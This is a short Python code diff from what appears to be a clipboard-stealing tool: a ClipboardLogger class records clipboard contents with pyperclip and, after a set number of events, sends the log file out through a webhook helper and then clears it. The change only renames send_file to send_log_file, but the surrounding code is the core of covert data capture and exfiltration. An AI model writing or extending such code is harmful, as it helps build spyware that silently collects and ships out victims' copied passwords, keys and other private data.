@@ -2,7 +2,7 @@ import pyperclip
 import time
 
 from utils.logging_utils import log_info, log_error, log_to_file
-from utils.webhook_utils import send_file
+from utils.webhook_utils import send_log_file
 from utils.file_utils import clear_log_file
 from config import CLIPBOARD_LOG_INTERVAL_SEC, CLIPBOARD_EVENTS_BEFORE_SEND
 
@@ -24,7 +24,7 @@ class ClipboardLogger:
         self.counter += 1
         if self.counter > self.counter_max:
             log_info("SENDING CLIPBOARD LOG FILE")
-            send_file(self.log_file)
+            send_log_file(self.log_file)
             clear_log_file(self.log_file)
             log_info("Sent and cleared clipboard log file.")
             self.counter = 0
